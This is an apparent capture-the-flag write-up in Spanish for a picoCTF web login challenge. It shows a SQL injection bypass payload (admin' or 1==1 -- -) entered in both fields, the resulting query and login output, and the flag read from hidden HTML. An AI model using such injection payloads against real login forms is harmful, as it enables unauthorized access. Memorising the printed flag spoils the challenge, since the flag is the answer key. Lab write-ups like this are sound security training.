Description
Can you login to this website?
Try to login here.

vamos a inspeccionar el codigo
vemos la opcion de loggin
y nos dice 
<pre>username: 
password: 
SQL query: SELECT * FROM users WHERE name=&#039;&#039; AND password=&#039;&#039;
</pre><h1>Login failed.</h1>
intentamos uasr una inyeccion SQl
poneindo 
admin' or  1==1 -- - en user y pasword
nombre de usuario: admin' o 1==1 -- -
contraseña: admin' o 1==1 -- -


Y nos sale esto 

Consulta SQL: SELECT * FROM users WHERE nombre='admin' o 1==1 -- -' Y contraseña='admin' o 1==1 -- -'
¡Iniciaste sesión! Pero, ¿puedes ver la bandera? Está a la vista.

pero no se ve la bandera, asiq ue le damos control u y nos aparece esto 
<pre>username: admin&#039; or  1==1 -- -
password: admin&#039; or  1==1 -- -
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; or  1==1 -- -&#039; AND password=&#039;admin&#039; or  1==1 -- -&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>
y ahi nos da la bandera


Bandera
==picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}==

Referencias
https://www.youtube.com/watch?v=FNVx9hCSwTY